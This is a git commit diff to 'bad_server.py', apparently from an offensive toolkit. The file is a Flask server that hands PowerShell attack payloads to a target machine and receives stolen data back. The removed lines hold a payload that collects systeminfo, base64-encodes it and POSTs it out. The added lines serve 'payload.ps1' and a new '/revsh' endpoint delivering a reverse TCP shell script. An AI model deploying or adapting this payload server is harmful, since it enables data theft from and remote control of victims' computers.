0f6e7c87f6c603a1116de65460e503019bd09755
Mingda Song <songmingda1234@hotmail.com>
2018-06-02 12:54:03 +0800

    modified:   bad_server.py 	payload.ps1 	revShHandler.py 	reverse_tcp_shell.ps1

--- bad_server.py
+++ bad_server.py
@@ -1,15 +1,16 @@
 # This file gives an example of sending the attack payload back to the target
 
-from flask import Flask, request
+from flask import *
 import base64
+import sys
 
 app = Flask('__main__')
-payload = '''
-$i=systeminfo
-$b=[System.Text.Encoding]::UTF8.GetBytes($i);
-$p=@{d=[System.Convert]::ToBase64String($b)}
-IWR -Uri 127.0.0.1 -Method POST -Body $p;
-'''
+
+def openFile(path, name):
+	content = ''
+	with open('%s\\%s'%(path, name), 'rt') as file:
+		content = file.read()
+	return content
 
 @app.route('/', methods = ['POST', 'GET'])
 def root():
@@ -19,7 +20,11 @@ def root():
 		print plain
 		return ''
 	else:
-		return payload
+		return openFile('.', 'payload.ps1')
+
+@app.route('/revsh', methods = ['GET'])
+def reverseShell():
+	return openFile('.', 'reverse_tcp_shell.ps1')
 
 if __name__ == '__main__':
-	app.run(port = 80, use_reloader = True)
+	app.run(port = 80, debug = True)
